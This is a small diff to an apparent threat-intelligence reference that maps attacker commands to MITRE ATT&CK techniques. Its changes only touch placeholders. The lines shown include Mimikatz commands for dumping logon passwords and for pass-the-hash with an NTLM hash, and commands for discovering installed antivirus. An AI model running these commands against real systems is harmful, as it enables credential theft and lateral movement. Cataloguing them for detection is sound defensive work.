@@ -443,7 +443,7 @@ sc query <service_name>
 Use Alternate Authentication Material: Pass the Hash [[T1550.002](https://attack.mitre.org/techniques/T1550/002/)]
 
 ```
-<mimikatz>.exe "privilege::debug" "sekurlsa::logonpasswords" exit > out.txt
+<mimikatz>.exe "privilege::debug" "sekurlsa::logonpasswords" exit > <output_file>.txt
 <mimikatz>.exe "privilege::debug" "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>" exit
 ```
 * File name is often changed
@@ -507,7 +507,7 @@ bcdedit /set {default} bootstatuspolicy ignoreallfailures
 Software Discovery: Security Software Discovery [[T1518.001](https://attack.mitre.org/techniques/T1518/001/)]
 
 ```
-WMIC /Node:localhost /Namespace:\\remotepath Path AntiVirusProduct Get * /Format:List
+wmic /Node:localhost /Namespace:\\remotepath Path AntiVirusProduct Get * /Format:List
 sc query WinDefend
 ```
 
